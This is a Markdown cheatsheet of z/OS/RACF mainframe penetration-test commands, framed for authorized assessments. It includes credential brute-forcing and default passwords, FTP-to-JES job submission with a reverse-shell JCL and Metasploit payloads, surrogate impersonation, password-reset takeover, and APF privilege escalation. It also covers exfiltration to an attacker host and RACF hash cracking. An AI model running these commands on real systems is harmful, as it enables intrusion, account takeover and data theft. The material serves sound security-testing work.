# 12 — Mainframe Pen-Test Command Cheatsheet

> **Purpose:** Field reference of **useful commands** for authorized IBM z/OS / RACF assessments, with **why you run them**.  
> **Companion notes:** [[05-Pentest-Methodology]], [[06-Privilege-Escalation-and-Misconfigs]], [[08-Tools-and-Lab-Setup]].  
> **Rule:** Only on systems you own or are explicitly authorized to test. Prefer TEST/QA. Avoid lockouts, job floods, and unapproved APF/RACF changes.

---

## How to use this sheet

| Phase | Sections |
|------:|----------|
| Pre-auth | §1 Network recon · §2 User/cred testing · §3 Clients |
| Foothold | §4 FTP/JES · §5 TSO/ISPF basics · §6 SDSF · §7 Console |
| Post-auth enum | §8 Identity · §9 RACF · §10 Datasets · §11 APF/TCB |
| Privesc hunt | §12 Resource classes · §13 SURROGAT · §14 USS |
| Apps / data | §15 CICS · §16 Credential hunt · §17 Exfil |
| Automation | §18 Community tools · §19 Offline RACF |

**Legend**

| Prefix | Where it runs |
|--------|----------------|
| `HOST>` | Your workstation (Linux/Windows/Kali) |
| `TSO>` | TSO READY / option 6 Command |
| `ISPF>` | ISPF panel navigation |
| `SDSF>` | SDSF primary commands |
| `CONS>` | Operator console / SDSF CONSOLE (needs authority) |
| `FTP>` | z/OS FTP client session |
| `USS>` | OMVS / SSH shell |
| `CICS>` | CICS 3270 session |

Replace placeholders: `<IP>`, `<USERID>`, `<DATASET>`, `<CLASS>`, `<PASSWORD>`.

---

## Safety first (read once)

| Do | Do not |
|----|--------|
| Rate-limit sprays; know lockout policy | High-thread password storms |
| Prefer read-only proofs | Permanent SPECIAL/APF changes without approval |
| Use canary files for exfil proof | Bulk download of PAN/PII |
| Log every change + cleanup plan | Flood JES queues / NJE |
| Prefer mirrored TEST LPAR | Blind SETPROG / destructive JCL in PROD |

---

## 1. Network reconnaissance

### Why
Confirm you are looking at a mainframe, map attack surface (TN3270, FTP, SSH, MQ, NJE, web), and identify clear-text vs TLS before any auth work.

### Full TCP + version scan
```bash
# HOST> Discover services/versions on authorized targets
nmap -sTV -p- --version-intensity 9 -Pn -oA out/mf_full <IP>
```
**Why:** Mainframes often expose unusual ports (FTP on 900, Telnet on 1023). Full scan avoids missing alternate listeners.

### Focused mainframe ports
```bash
# HOST> High-value port set (adjust to scope)
nmap -sV -p 21,22,23,24,175,443,515,900,992,1023,1414,1415,2252,2809,8803 \
  --script banner -oA out/mf_ports <IP>
```
**Why:** Fast map of TN3270, FTP, NJE, MQ, and management portals.

### TN3270 / VTAM screen capture
```bash
# HOST> Grab what greets you on 3270 ports
nmap -sV -p 23,992,2323 --script tn3270-screen -oA out/tn3270 <IP>

# HOST> Enumerate VTAM applications (rate-limit!)
nmap -p 23 --script vtam-enum --script-args brute.threads=3 <IP>

# HOST> LU enumeration (site-dependent scripts)
nmap -p 23 --script lu-enum <IP>
```
**Why:** Identifies TSO vs CICS vs session manager (TPX) landing, and which APPLIDs are exposed.

### Banner / TLS checks
```bash
# HOST> Clear-text FTP banner
nc -nv <IP> 21

# HOST> FTP STARTTLS probe
openssl s_client -connect <IP>:21 -starttls ftp

# HOST> TN3270 TLS (992) certificate
openssl s_client -connect <IP>:992 </dev/null
```
**Why:** Clear-text protocols are findings; cert subject/SAN often reveals LPAR/sysplex names.

### Typical port → meaning (hunt list)

| Port | Hint | Why it matters |
|-----:|------|----------------|
| 21 / 900 | z/OS FTP | Datasets + optional JES submit |
| 22 | SSH → USS | Familiar Unix foothold |
| 23 / 1023 | TN3270/Telnet | Primary green-screen entry |
| 992 | TN3270 TLS | Preferred secure terminal |
| 175 / 2252 | NJE | Lateral job submission |
| 1414+ | IBM MQ | Channel/MCAUSER risk |
| 80/443 | HTTP / WAS / z/OSMF | Web apps, Basic Auth, APIs |

---

## 2. Username enumeration & credential testing

### Why
Weak default policy (historical 1–8 char uppercase passwords), password=userid patterns, and leftover defaults still appear on TEST systems. Enumeration is **noisy** — get written approval and know lockout.

### TSO user enumeration (Nmap)
```bash
# HOST> Does the logon path reveal valid userids?
nmap -p 23 <IP> --script tso-enum \
  --script-args userdb=users.txt -vv
```
**Why:** Classic TN3270/TSO behavior sometimes returns different messages for valid vs invalid IDs — builds a target list without passwords.

### Credential testing (authorized only)
```bash
# HOST> TSO brute/spray — LOW threads, scoped wordlists
nmap -p 23 <IP> --script tso-brute \
  --script-args userdb=users.txt,passdb=passwords.txt -vv

# HOST> Patator against telnet/TSO-style logon (args vary by module)
patator telnet_login host=<IP> port=23 user=FILE0 password=FILE1 \
  0=users.txt 1=passwords.txt -x ignore:fgrep='not authorized' \
  --rate-limit=1

# HOST> HTTP Basic Auth (sometimes accepts PASSPHRASE paths)
hydra -L users.txt -P passwords.txt -s 80 -f <IP> http-get /
```
**Why:** Confirms reuse, defaults, and weak policy. Always rate-limit.

### Defaults worth trying **only on authorized TEST**
| User | Common lab/default pattern | Why |
|------|---------------------------|-----|
| `IBMUSER` | `SYS1` (lab lore) | Install leftovers |
| `SYSADM` / `WEBADM` | same as userid | Product defaults |

Public default lists exist (e.g. community `default_accounts.txt`). Never spray these on PROD without explicit approval.

---

## 3. Client connections (get a seat)

### Why
Different channels give different capabilities: 3270 for TSO/CICS, SSH for USS, FTP for datasets/JES.

```bash
# HOST> TN3270 emulator
x3270 <IP>
x3270 -port 992 <IP>                    # TLS port when used
c3270 <IP>                              # console-friendly
wc3270 <IP>                             # Windows

# HOST> With proxy / charset (Securelist-style patterns)
x3270 -proxy socks4:<PROXY>:1080 -user <USERID> <IP>
x3270 -charset bracket <IP>

# HOST> USS via SSH
ssh <USERID>@<IP>

# HOST> Plain telnet (if still offered — report clear-text)
telnet <IP> 23
```
**Why:** x3270 is the standard interactive path; SSH is often the most comfortable post-auth shell.

After connect: note VTAM menu, type logon string if required (e.g. `TSO`, `CICS`, APPLID name).

---

## 4. FTP: datasets, USS files, and JES job submit

### Why
z/OS FTP is unusually powerful: list/download datasets **and** submit JCL to JES when `FILETYPE=JES` is allowed. That is remote code/job execution as the authenticated user.

### Login & explore
```text
HOST> ftp <IP>
FTP> user <USERID>
FTP> pass <PASSWORD>
FTP> quote site filetype=seq          # sequential datasets (common default)
FTP> ls                               # list current context
FTP> cd '<HLQ>.'                      # navigate catalog (quotes often required)
FTP> get 'USERID.MY.PDS(MEMBER)'      # download a member
FTP> put local.jcl 'USERID.JCL.CNTL(TEST)'
```
**Why:** Proves data access and maps HLQs you can reach.

### USS path via FTP
```text
FTP> quote site filetype=seq
FTP> cd /u/<userid>
FTP> ls
FTP> get /etc/httpd.conf
```
**Why:** Configs, histories, and web secrets often live under USS.

### JES mode — submit a job
```text
FTP> quote site filetype=jes
FTP> put reverse.jcl
FTP> dir                              # list jobs / job numbers
FTP> get JOB01234                     # retrieve output (syntax varies)
FTP> quote site filetype=seq          # return to normal
```
**Why:** Submits batch work remotely without a 3270 session. Classic foothold path (MainTP / Metasploit FTP JCL patterns).

### Minimal “whoami” style JCL (safe enumeration job)
```jcl
//WHOAMI   JOB (ACCT),'PT-ENUM',CLASS=A,MSGCLASS=H,
//         NOTIFY=&SYSUID,MSGLEVEL=(1,1)
//STEP1    EXEC PGM=IKJEFT01
//SYSTSPRT DD  SYSOUT=*
//SYSTSIN  DD  *
  PROFILE
  LISTUSER
/*
```
**Why:** Confirms job submission works and captures RACF `LISTUSER` output in spool.

### Metasploit (lab / authorized only)
```text
# HOST> msfconsole
use exploit/mainframe/ftp/ftp_jcl_creds
set RHOSTS <IP>
set FTPUSER <USERID>
set FTPPASS <PASSWORD>
# payloads: generic_jcl, reverse shell, apf_privesc_jcl (lab!)
```
**Why:** Automates FTP→JES patterns for demos; do not fire APF payloads in PROD without change control.

---

## 5. TSO / ISPF essentials

### Why
TSO is the interactive command plane; ISPF is the panel IDE. Most RACF and dataset work happens here.

### Enter environments
```text
TSO> ISPF                    # enter ISPF
TSO> OMVS                    # enter Unix shell (needs OMVS segment)
TSO> SDSF                    # job/system display (if authorized)
TSO> READY                   # return to TSO READY prompt from some panels
```

### ISPF navigation cheat
| Path | Action | Why |
|------|--------|-----|
| `=3.4` | Dataset list / DSLIST | Catalog hunt, browse libs |
| `=3.2` | Dataset utility | Allocate/delete (careful) |
| `=6` | TSO command shell | Run RACF/TSO cmds from ISPF |
| `=2` | Edit | View source/JCL |
| `=1` | Browse | Read-only view |
| `PF3` | End / back | Always |
| `PF1` | Help | |

```text
ISPF> =3.4
ISPF>   Dsname Level: SYS1.PARMLIB
ISPF>   (B)rowse / (E)dit / (M)ember list
ISPF> =3.4
ISPF>   Dsname Level: *.*RACF*.**
```
**Why:** Locate PARMLIB, PROCLIB, RACF-related datasets, app HLQs without guessing.

### Profile & basic TSO
```text
TSO> PROFILE                     # your TSO profile settings
TSO> PROFILE PREFIX(USERID)      # set dataset prefix
TSO> LISTALC STATUS HISTORY      # allocated datasets
TSO> LISTBC                      # broadcast messages (info disclosure)
TSO> TIME                        # system time / CPU (sanity)
TSO> SEND 'test' USER(<USERID>)  # messaging (policy dependent)
```
**Why:** Confirms identity context and what’s already allocated in the session.

### Submit & track jobs from TSO
```text
TSO> SUBMIT 'USERID.JCL.CNTL(JOB1)'
TSO> STATUS
TSO> OUTPUT jobname(jobid) PRINT(*)
```
**Why:** Native batch execution without FTP.

### Run a REXX/CLIST
```text
TSO> EXEC 'USERID.REXX.LIB(ENUM)' 'ALL'
TSO> EX 'USERID.REXX.LIB(SEARCHRX)'
```
**Why:** Community enum scripts (mainframed ENUM, APFCHECK helpers, etc.).

---

## 6. SDSF (jobs, logs, output)

### Why
Spool is a goldmine: other users’ job output, passwords printed in JCL, system messages, APF-related ops. Access is highly privilege-sensitive — inability is itself a control data point.

```text
TSO> SDSF
SDSF> ST                     # status of jobs
SDSF> DA                     # display active address spaces
SDSF> I                      # input queue
SDSF> O                      # output queue
SDSF> H                      # held output
SDSF> LOG                    # syslog
SDSF> PREFIX <USERID>*       # filter to your jobs
SDSF> OWNER <USERID>
SDSF> FIND password          # search current view (if supported)
SDSF> ?                      # help / column help
```
**Why:** Monitor your enum jobs; look for mis-permissioned spool read (others’ SYSOUT).

```text
SDSF> INIT                   # initiators (JES health / classes)
```
**Why:** Understand job classes available for submission.

---

## 7. Operator / display commands (authorized)

### Why
Console-level `DISPLAY` commands reveal APF list, IPL info, sysplex, OMVS processes — critical for trust-boundary mapping. **Requires CONSOLE / OPERCMDS authority.**

```text
CONS> D IPLINFO              # IPL volume, parms, time
CONS> D M=CPU                # CPU / model info
CONS> D PROG,APF             # *** APF library list ***
CONS> D PROG,LNKLST          # linklist
CONS> D PROG,LPA             # LPA
CONS> D PROG,EXIT            # exits
CONS> D PARMLIB              # active PARMLIB concatenation
CONS> D SMF,O                # SMF options
CONS> D XCF,SYSPLEX          # sysplex membership
CONS> D OMVS,A=ALL           # Unix processes
CONS> D TS,ALL               # logged-on TSO users
CONS> D A,ALL                # active jobs / STCs
CONS> D JOBS,ALL
```
**Why:** `D PROG,APF` is the authoritative APF inventory for privesc hunting.

From TSO (if CONSOLE allowed):
```text
TSO> CONSOLE
TSO>   D PROG,APF
```

### Dangerous (demonstrate capability only with approval)
```text
CONS> SETPROG APF,ADD,DSNAME=<YOUR.LOADLIB>,SMS
```
**Why:** Dynamic APF add = critical finding if a non-sysprog can do it. Prefer **proving OPERCMDS access** via `RLIST` rather than actually modifying PROD APF.

---

## 8. Who am I? (identity enumeration)

### Why
You need userid, groups, SPECIAL/OPERATIONS, TSO/OMVS segments, and UID before hunting privesc.

```text
TSO> LISTUSER
TSO> LU                      # abbreviation
TSO> LU <USERID>             # other user (if authorized)
TSO> LU <USERID> TSO OMVS NETVIEW CICS   # request segments
TSO> LU <USERID> NORACF TSO  # TSO segment only pattern
```
**Why:** Shows attributes (SPECIAL, OPERATIONS, AUDITOR, RESTRICTED, PROTECTED), default group, connects, last logon, password interval.

```text
TSO> LISTGRP
TSO> LG <GROUP>
TSO> LG <GROUP> USER(USERID)   # connect details when permitted
```
**Why:** Group connects often carry the real privileges (connect attributes, UACC defaults).

### USS identity
```text
TSO> OMVS
USS> id
USS> id -a
USS> whoami
USS> echo $USER $LOGNAME
USS> uname -a
USS> tsocmd "LISTUSER"       # bridge TSO cmds from shell when available
```
**Why:** UID 0 vs BPX.SUPERUSER are different paths; map both planes.

---

## 9. RACF system & profile enumeration

### Why
RACF (or ACF2/TSS) is the decision brain. Misconfigs here are the core of mainframe PT findings.

### Global options
```text
TSO> SETROPTS LIST
TSO> SETR LIST               # abbreviation
```
**Why:** Password policy, PROTECTALL, inactive intervals, active classes, auditing, mixed-case, KDFAES indicators, model options. Gold for control-gap reports.

### RACF dataset status
```text
TSO> RVARY LIST
TSO> RVARY                   # status of primary/backup RACF DBs
```
**Why:** Locates RACF database datasets for protection review (UACC, who can READ/UPDATE the DB).

### Search profiles
```text
TSO> SEARCH CLASS(USER)
TSO> SR CLASS(USER)                      # all users (noisy / priv needed)
TSO> SR CLASS(GROUP)
TSO> SR CLASS(DATASET) WARNING
TSO> SR ALL WARNING NOMASK
TSO> SR CLASS(SURROGAT)
TSO> SR CLASS(SURROGAT) FILTER(*.SUBMIT)
TSO> SR CLASS(SURROGAT) FILTER(BPX.SRV.*)
TSO> SR CLASS(FACILITY) FILTER(BPX.**)
TSO> SR CLASS(FACILITY) FILTER(IRR.**)
TSO> SR CLASS(UNIXPRIV)
TSO> SR CLASS(OPERCMDS)
TSO> SR CLASS(TSOAUTH)
TSO> SR CLASS(USER) UID(0)               # OMVS UID 0 users
```
**Why:** WARNING mode = access allowed despite ACL fail. SURROGAT/BPX/OPERCMDS are classic privesc classes.

### List general resource profiles
```text
TSO> RLIST FACILITY BPX.SUPERUSER ALL
TSO> RL FACILITY BPX.SUPERUSER AUTH
TSO> RL FACILITY BPX.FILEATTR.APF AUTH
TSO> RL FACILITY BPX.DAEMON ALL
TSO> RL FACILITY BPX.SERVER ALL
TSO> RL FACILITY IRR.PASSWORD.RESET AUTH
TSO> RL FACILITY IRR.RADMIN.** AUTH
TSO> RL OPERCMDS MVS.SETPROG.** AUTH
TSO> RL OPERCMDS MVS.SET.PROG.** AUTH
TSO> RL TSOAUTH TESTAUTH AUTH
TSO> RL TSOAUTH CONSOLE AUTH
TSO> RL SURROGAT <USERID>.SUBMIT AUTHUSER
TSO> RL SURROGAT BPX.SRV.<USERID> AUTHUSER
TSO> RL STARTED ** ALL                   # started task maps (if permitted)
```
**Why:** `AUTH` / `AUTHUSER` shows *your* or listed access. READ on many FACILITY resources **grants the privilege** (not “read the profile only”).

### List dataset profiles
```text
TSO> LISTDSD DATASET('SYS1.LINKLIB') ALL
TSO> LD DA('SYS1.PARMLIB') ALL GENERIC
TSO> LD DA('SYS1.RACF**') GEN
TSO> LD DA('<APF.DATASET>') ALL
```
**Why:** UACC, ID list, WARNING, AUDIT settings — check every APF library you can see.

### High-value RACF questions → commands

| Question | Command pattern |
|----------|-----------------|
| Password policy? | `SETR LIST` |
| PROTECTALL FAIL? | `SETR LIST` |
| Who is SPECIAL? | DSMON / `LU` privileged IDs / unload analysis |
| WARNING profiles? | `SR CLASS(DATASET) WARNING` / `SR ALL WARNING` |
| Surrogate jobs? | `SR CLASS(SURROGAT)` + `RL … SUBMIT` |
| Can I su in USS? | `RL FACILITY BPX.SUPERUSER AUTH` |
| Can I reset pw? | `RL FACILITY IRR.PASSWORD.RESET AUTH` |
| Can I SETPROG? | `RL OPERCMDS MVS.SETPROG.** AUTH` |
| Can I TESTAUTH? | `RL TSOAUTH TESTAUTH AUTH` |

---

## 10. Dataset & catalog hunting

### Why
Data plane is often the business objective; writable libs under LINKLIST/SYSPROC can be privesc.

```text
ISPF> =3.4 → Dsname Level: <USERID>
ISPF> =3.4 → Dsname Level: SYS1.*
ISPF> =3.4 → Dsname Level: *.*BACKUP*.**
ISPF> =3.4 → Dsname Level: *.*RACF*.**
ISPF> =3.4 → Dsname Level: VENDOR.*.LOADLIB
```

```text
TSO> LISTCAT ENTRIES('<HLQ>.**') ALL
TSO> LISTC LVL(<HLQ>)
TSO> LISTDS '<PDS>' MEMBERS
TSO> TRANSMIT ...                        # rarely needed; know it exists
```
**Why:** Catalog maps what exists; LISTDSD maps *who may access it*.

### Sensitive dataset targets (read if allowed — report exposure)
| Target pattern | Why |
|----------------|-----|
| RACF primary/backup DB | Offline hash & config analysis |
| `SYS1.UADS` | Legacy TSO auth if poorly protected |
| `SYS1.PARMLIB` / site PARMLIBs | IPL, APF, SMF, PPT |
| `SYS1.PROCLIB` + site PROCLIBs | Started procs, secrets in JCL |
| APF load libs | Integrity / privesc |
| App HLQ `*.JCL`, `*.CNTL` | Hardcoded passwords |
| Spool / log datasets | Credential leakage |

---

## 11. APF, LINKLIST, and trusted computing base

### Why
Write access to an APF library (or ability to APF-authorize your own lib) is the mainframe “kernel module write” equivalent.

### Enumerate APF
```text
CONS> D PROG,APF
TSO>  ISRDDN                         # then APF (ISPF member list tool)
# Community:
TSO> EX 'HLQ.REXX(APFCHECK)'         # or submit APFCHECK JCL
TSO> EX 'HLQ.ELV.APF' 'LIST'         # ayoul3 list mode
TSO> ENUM APF                        # mainframed ENUM
```
**Why:** Build the full APF inventory, then test access on each.

### Check access on each APF dataset
```text
TSO> LD DA('<APF.DSN>') ALL
# or ACCESS program / custom REXX
```
**Why:** Looking for UPDATE/ALTER for your ID/group — critical finding.

### Linklist / LPA
```text
CONS> D PROG,LNKLST
CONS> D PROG,LPA
TSO> EX 'HLQ.SYS0WN'                 # SYSPROC/SYSEXEC writability
```
**Why:** Writable SYSPROC/SYSEXEC = REXX injection into privileged users’ path.

### TESTAUTH path
```text
TSO> RL TSOAUTH TESTAUTH AUTH
TSO> TESTAUTH 'SOME.LOADLIB(MEMBER)'
```
**Why:** Runs a program as APF-authorized — dangerous if you can also place code.

---

## 12. Privilege escalation resource checks (quick fire)

### Why
These are the Securelist / industry “greatest hits.” Enumerate **before** exploiting.

```text
# --- FACILITY / USS power ---
TSO> RL FACILITY BPX.SUPERUSER AUTH
TSO> RL FACILITY BPX.FILEATTR.APF AUTH
TSO> RL FACILITY BPX.DAEMON ALL
TSO> RL FACILITY BPX.SERVER ALL
TSO> RL FACILITY IRR.PASSWORD.RESET AUTH
TSO> SR CLASS(UNIXPRIV)

# --- Operator / APF dynamic ---
TSO> RL OPERCMDS MVS.SETPROG.** AUTH
TSO> RL OPERCMDS ** AUTH              # only if narrow results expected

# --- TSO privileges ---
TSO> RL TSOAUTH TESTAUTH AUTH
TSO> RL TSOAUTH ACCOUNT AUTH
TSO> RL TSOAUTH CONSOLE AUTH
TSO> RL TSOAUTH PARMLIB AUTH
TSO> RL TSOAUTH OPER AUTH

# --- WARNING / weak UACC ---
TSO> SR CLASS(DATASET) WARNING
TSO> SR ALL WARNING NOMASK
```

### If BPX.SUPERUSER (READ)
```text
TSO> OMVS
USS> su
USS> su root
USS> id
```
**Why:** Superuser in USS plane — then hunt secrets / host pivots.

### If BPX.FILEATTR.APF (READ)
```text
USS> extattr +a ./mypayload
USS> ls -E ./mypayload              # verify APF extended attribute
```
**Why:** Marks USS file APF-authorized — bridge to APF abuse patterns.

### If IRR.PASSWORD.RESET (READ)
```text
TSO> ALU <TARGET> PASSWORD(<TEMP>) RESUME
```
**Why:** Account takeover for users without special attributes — lateral identity pivot. **Only with ROE.**

### If OPERCMDS SETPROG (UPDATE)
```text
# Prefer reporting access; if approved demo on TEST:
CONS> SETPROG APF,ADD,DSNAME=<YOUR.LIB>,SMS
```
**Why:** You control APF list → trivial path to SPECIAL-class impact via authorized code.

---

## 13. SURROGAT (impersonation)

### Why
Job schedulers need surrogate rights; over-broad `*.SUBMIT` or `BPX.SRV.*` = run as privileged batch/admin IDs without their password.

```text
TSO> SR CLASS(SURROGAT)
TSO> SR CLASS(SURROGAT) FILTER(*.SUBMIT)
TSO> SR CLASS(SURROGAT) FILTER(BPX.SRV.*)
TSO> RL SURROGAT <PRIVUSER>.SUBMIT AUTHUSER
TSO> RL SURROGAT BPX.SRV.<PRIVUSER> AUTHUSER
```

### JES submit as another user (JOB card)
```jcl
//JOBNAME  JOB (ACCT),'SURR',CLASS=A,MSGCLASS=H,
//         USER=<TARGETUSR>,PASSWORD=,NOTIFY=&SYSUID
//* PASSWORD often omitted when SURROGAT allows it
//STEP1    EXEC PGM=IKJEFT01
//SYSTSPRT DD SYSOUT=*
//SYSTSIN  DD *
  LISTUSER
/*
```
```text
TSO> SUBMIT 'USERID.JCL(SURRJOB)'
```
**Why:** Proof you inherit target’s ACEE for that job — critical if target is SPECIAL/ops/app admin.

### USS switch user
```text
USS> su -s <TARGETUSR>
```
**Why:** Requires `BPX.SRV.<TARGETUSR>` SURROGAT — Unix-side impersonation.

---

## 14. USS / OMVS deeper enum

### Why
Unix plane holds web configs, LDAP/Kerberos keys, histories, and sometimes weaker file ACLs.

```text
USS> uname -a
USS> id; groups
USS> df -P
USS> mount
USS> ls -la /
USS> ls -la /u
USS> ls -la /etc
USS> ls -laE /path/bin/*            # extended attrs (APF/shareas)
USS> find /u -type f -name '*pass*' 2>/dev/null
USS> find /etc -type f 2>/dev/null | head
USS> env
USS> cat ~/.sh_history 2>/dev/null
USS> cat ~/.bash_history 2>/dev/null
USS> ls -la /service/UserLog/ 2>/dev/null
```
**Why:** Credential hunting + writable script dirs used by privileged automation.

### High-value USS paths
| Path | Why |
|------|-----|
| `/u/*` | Home dirs, keys, notes |
| `/etc/ldap/` | LDAP bind secrets |
| `/etc/skrb/` | Kerberos config |
| `/etc/httpd.conf` | IBM HTTP Server |
| `.../security.xml` | WebSphere `{XOR}` passwords |
| `/usr/lpp/internet/server_root/Admin/webadmin.passwd` | HTTP admin hash file |
| stash `*.sth` files | Weakly protected secrets |

### WebSphere XOR decode (offline)
```bash
# HOST> after exfiling security.xml password field
python websphere-xor-password-decode-encode.py -d '<base64>'
```
**Why:** `{XOR}` is encoding, not strong crypto — often yields mid-tier or LDAP passwords.

### Stash file (conceptual)
```bash
# USS/HOST pattern discussed in public research — XOR-ish with 0xF5
perl -C0 -n0xF5 -e 'print $_^"\xF5"x length."\n";exit' < key.sth > unstash.key
# then convert EBCDIC→ASCII if needed
dd conv=ascii if=unstash.key of=unstash_ascii.key
```
**Why:** LDAP/HTTP stash recovery for lateral movement.

### Community USS enum
```text
USS> sh OMVSEnum.sh
# or from mainframed Enumeration Unix tools
```
**Why:** Automates SUID/interesting permission sweeps carefully.

---

## 15. CICS quick commands

### Why
Business logic and admin transactions often beat “get SPECIAL” for real risk.

```text
# On CICS 3270 blank screen / clear:
CICS> CESN                    # sign on (if used)
CICS> CESF                    # sign off
CICS> CEMT I TRAN             # inquire transactions (admin — if allowed)
CICS> CEMT I PROG
CICS> CEMT I FILE
CICS> CECI                    # command-level interpreter (dangerous if open)
CICS> CEDF                    # execution diagnostic facility
CICS> CEBR                    # temp storage browse
```
**Why:** Unauthorized CEMT/CECI = region admin / data access. Document any sensitive tran open to general users.

### Nmap CICS helpers (careful)
```bash
HOST> nmap -p 23 --script cics-enum --script-args ... <IP>
HOST> nmap -p 23 --script cics-user-enum ... <IP>
```
**Why:** Transaction/user discovery — can lock or alert; throttle.

### Research tools
| Tool | Why |
|------|-----|
| CICSpwn | CICS interaction / abuse research |
| BIRP | 3270 app testing |

---

## 16. Credential hunting commands

### Why
Soft privesc: JCL passwords, logs, configs beat exotic memory tricks.

```text
# Dataset keyword search (after you have a DSN list)
TSO> EX 'HLQ.DSNSRCH' 'USERID.DSNLIST PASSWORD'
TSO> EX 'HLQ.DSNSRCH' 'USERID.DSNLIST SECRET'
```

```text
USS> grep -R -i password /u/<you> 2>/dev/null
USS> grep -R '{XOR}' /WebSphere 2>/dev/null
USS> grep -R -i pwd /etc 2>/dev/null | head
```

```text
SDSF> LOG → search for ALU / PASSWORD / violations
ISPF> =3.4 → USERID.SPFLOG*.LIST      # ISPF logs sometimes juicy
```
**Why:** Operators and apps accidentally leave secrets in spool and personal logs.

---

## 17. Exfiltration (controlled proof)

### Why
Show impact without stealing regulated data. Prefer customer canary files.

```bash
# HOST> FTP download proof
ftp <IP>
  get 'USERID.CANARY.DATA'
  get /u/userid/canary.txt

# HOST> SFTP/SCP when SSH enabled
sftp <USERID>@<IP>
scp <USERID>@<IP>:/u/userid/canary.txt .

# HOST> from USS reverse direction
USS> scp ./canary.txt analyst@yourbox:
USS> ftp yourbox
```

```text
# x3270 IND$FILE transfer (when FTP/SSH blocked)
# File Transfer dialog / transfer command in emulator
```

```text
# Community TCP exfil REXX (egress test)
TSO> EX 'HLQ.EXFIL' 'DATASET.TO.SEND 10.0.0.5 443 80 8080'
```
**Why:** Proves data leaves the LPAR; pick non-sensitive proof artifacts.

### EBCDIC gotcha
```bash
# HOST> convert text after download if garbled
iconv -f EBCDIC-US -t UTF-8 dumped.txt > readable.txt
# or dd conv=ascii (site-dependent)
```
**Why:** Mainframe text is often EBCDIC; ASCII tools mis-parse without conversion.

---

## 18. Community enumeration tooling (authorized copies)

### Why
Speeds boring inventory; understand each script before running (prefer list/report modes).

| Tool | How / example | Why |
|------|----------------|-----|
| **ENUM** (mainframed) | `ENUM ALL` / `ENUM APF` / `ENUM SEC` / `ENUM WHO` | In-memory style recon: APF, SVC, security mgr, users |
| **SEARCHRX** | `EX 'HLQ(SEARCHRX)'` | Bundle of high-value RACF SEARCH cmds |
| **APFCHECK** | Submit JCL job | APF list + your access level |
| **SYS0WN** | `EX 'HLQ.SYS0WN'` | Writable SYSPROC/SYSEXEC |
| **STARTMAP** | `EX 'HLQ.STARTMAP'` | IPL / PARMLIB map |
| **ACCESS** | `CALL 'LIB(ACCESS)' 'DSN'` | RACROUTE auth check |
| **ELV.APF** (ayoul3) | `EX 'ELV.APF' 'LIST'` | APF enum / (lab) elevate |
| **OMVSEnum** | shell script | USS privesc file hunt |
| **MainTP / TShOcker** | FTP JES / REXX shells | Foothold automation |
| **NJElib** | Python NJE research | Lateral via NJE |
| **racfudit / racf2sql** | offline DB parse | Relationship & hash analysis |

```text
TSO> ENUM HELP
TSO> ENUM APF
TSO> ENUM SEC
TSO> ENUM WHO
TSO> ENUM TSTA
```
**Why:** Fast structured dump for notes/report appendices.

---

## 19. Offline RACF database analysis

### Why
If you can **read** the RACF DB dataset (finding by itself!), offline analysis yields hashes, UACC issues, group-SPECIAL chains, and attack paths without noisy online queries.

### Unload (on-box, if authorized utility access)
```text
TSO> IRRDBU00     # RACF database unload utility (batch JCL usually)
```
**Why:** Produces sequential unload for reporting tools — needs high privilege typically.

### Offline tooling (HOST)
```bash
# Parse raw DB or unload depending on tool
./racfudit -i RACF.DB -o out.sqlite      # conceptual — see tool docs
# or racf2sql → SQLite

# Example audit queries (from public Securelist/racfudit research)
sqlite3 out.sqlite "SELECT ProfileName,PHRASE,PASSWORD,CONGRPNM FROM USER_BASE WHERE CONGRPNM LIKE '%SYS1%';"
sqlite3 out.sqlite "SELECT ProfileName,UNIVACS FROM DATASET_BASE WHERE UNIVACS LIKE '1%';"
sqlite3 out.sqlite "SELECT ProfileName,CGGRPNM,CGUACC,CGFLAG2 FROM USER_BASE WHERE CGFLAG2 LIKE '%10000000%';"
sqlite3 out.sqlite "SELECT ProfileName,AUTHOR FROM USER_BASE WHERE AUTHOR NOT LIKE '%IBMUSER%' AND AUTHOR NOT LIKE 'SYS1%';"
```
**Why:** Privileged hashes, dangerous UACC, group-SPECIAL flags, odd profile owners.

### Password cracking (lab / authorized offline)
```bash
# DES RACF (hashcat mode 8500) — short uppercase space
hashcat -m 8500 racf.hashes wordlist.txt

# KDFAES — John the Ripper jumbo / research modules (slow)
john --format=racf-kdfaes hashes.txt
```
**Why:** Demonstrates weak algorithm (DES) or weak passphrases even under KDFAES.

---

## 20. One-page engagement flow (command order)

```text
1.  nmap full + tn3270-screen + banner
2.  x3270 connect → identify VTAM apps
3.  (approved) tso-enum / limited spray
4.  Login: TSO + FTP + SSH — note which work
5.  LU / id / SETR LIST / RVARY LIST
6.  SR WARNING + SR SURROGAT + RL BPX.* + RL OPERCMDS + RL TSOAUTH
7.  D PROG,APF (or ENUM APF) → LD each for UPDATE
8.  =3.4 hunt PARMLIB, PROCLIB, app HLQs; DSNSRCH passwords
9.  OMVS → sensitive paths, su if BPX.SUPERUSER
10. FTP JES or SUBMIT proof job (canary)
11. CICS tran map if in scope
12. Controlled exfil of canary + screenshots
13. Cleanup list + report
```

---

## 21. ACF2 / Top Secret (command shape only)

Sites may not run RACF. Concepts map; syntax differs.

| Goal | RACF | ACF2 (shape) | Top Secret (shape) |
|------|------|--------------|--------------------|
| Who am I | `LU` | `LIST` / `LIST LIKE(userid-)` | `TSS LIST(userid) DATA(ALL)` |
| Global opts | `SETR LIST` | `SHOW STATE` | `TSS MODIFY STATUS` |
| Dataset rules | `LD` / `SR` | `LIST LIKE(dsn-)` | `TSS LIST(DSN) ...` |
| Permit check | access attempt / zSecure | `TEST` | `TSS WHOHAS ...` |

**Why:** Don’t force RACF commands on ACF2/TSS systems — ask which ESM is in scope during kickoff.

---

## 22. Do-not-run-blind list

| Command / action | Risk |
|------------------|------|
| Mass `tso-brute` / hydra | Account lockouts, business outage |
| Unreviewed APF elevate scripts that `ALU SPECIAL` | Persistent compromise of PROD |
| `SETPROG` / PPT changes | Integrity failure, outages |
| NJE job storms | Multi-LPAR impact |
| Deleting datasets / catalogs | Catastrophic |
| Flooding JES with shells | Ops incident |

---

## 23. Quick copy-paste: post-auth RACF burst

Run from TSO option 6 after login (expect some failures — failures are data):

```text
LISTUSER
LISTGRP
SETROPTS LIST
RVARY LIST
SEARCH CLASS(DATASET) WARNING
SEARCH CLASS(SURROGAT)
SEARCH CLASS(FACILITY) FILTER(BPX.**)
SEARCH CLASS(FACILITY) FILTER(IRR.**)
SEARCH CLASS(UNIXPRIV)
SEARCH CLASS(OPERCMDS)
